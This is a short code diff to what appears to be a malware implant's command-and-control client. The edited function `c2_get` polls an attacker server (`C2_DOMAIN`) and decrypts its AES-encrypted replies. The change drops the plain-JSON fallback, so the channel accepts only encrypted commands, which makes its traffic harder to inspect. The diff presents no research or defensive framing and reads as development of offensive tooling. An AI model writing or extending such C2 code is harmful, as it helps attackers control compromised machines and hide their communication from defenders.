@@ -132,19 +132,14 @@ def c2_post(endpoint, data, timeout=10):
     )
 
 def c2_get(endpoint, params=None, timeout=10):
-    """Send GET to C2 and decrypt AES response"""
+    """Send GET to C2 and decrypt AES response. Returns None on any decryption failure."""
     resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
     if resp.status_code == 200 and resp.text.strip():
         try:
-            # Try AES decryption first
             decrypted = decrypt_aes(resp.text)
             return json.loads(decrypted)
         except Exception:
-            # Fallback to plain JSON
-            try:
-                return resp.json()
-            except Exception:
-                return None
+            return None
     return None
 
 
